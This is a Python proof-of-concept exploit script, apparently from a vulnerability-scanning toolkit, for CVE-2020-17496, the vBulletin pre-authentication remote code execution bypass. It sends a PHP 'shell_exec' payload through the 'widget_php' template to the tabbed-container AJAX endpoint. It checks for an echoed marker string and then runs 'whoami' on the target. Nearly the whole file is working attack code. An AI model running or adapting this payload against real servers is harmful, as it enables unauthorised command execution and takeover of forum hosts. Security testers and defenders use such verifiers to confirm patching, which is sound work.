#!/usr/bin/python3

from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class CVE_2020_17496_BaseVerify:
     def __init__(self, url):
          self.url = url
          if not self.url.startswith("http") and not self.url.startswith("https"):
               self.url = "http://" + self.url
          self.payload_url = self.url
          if '/ajax/render/widget_tabbedcontainer_tab_panel' not in self.payload_url:
               self.payload_url = self.payload_url + '/ajax/render/widget_tabbedcontainer_tab_panel'
          self.osname = 'Unknown'
          self.capta = get_capta()
          self.headers = {
            'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
          }
          self.check_payload = {
               'subWidgets[0][template]' : 'widget_php',
               'subWidgets[0][config][code]' : "echo shell_exec('%s'); exit;" % ('echo ' + self.capta + 'win^dowslin$1ux')
          }
          self.cmd_payload = {
               'subWidgets[0][template]' : 'widget_php',
               "subWidgets[0][config][code]": "echo shell_exec('whoami'); exit;"
          }

     def check(self):
          """
          检测是否存在漏洞

          :param:
          :return True or False
          """
          check_req = request.post(self.payload_url, data = self.check_payload)
          try:
               if check_req.status_code == 200 and self.capta in check_req.text:
                    if 'windows' in check_req.text:
                         self.osname = 'Windows'
                    elif 'linux' in check_req.text:
                         self.osname = 'Linux'
                    return True
               else:
                    return False
          except Exception as e:
               print(e)
               return False
          finally:
               pass

     def run(self):
          """
          执行命令

          :param:
          :return True or False
          """
          try:
               if self.check():
                    cmd_req = request.post(self.payload_url, headers = self.headers, data = self.cmd_payload)
                    if cmd_req.status_code == 200:
                         print('存在CVE_2019_16759_Bypass 漏洞,执行whoami命令结果为:', cmd_req.text.strip())
                         return True
                    else:
                         return False
               else:
                    return False, '不存在Bypass CVE-2019-16759漏洞'
          except Exception as e:
               print(e)
               return False
          finally:
               pass

if  __name__ == "__main__":
    CVE_2020_17496 = CVE_2020_17496_BaseVerify('http://127.0.0.1')
    print(CVE_2020_17496.run())
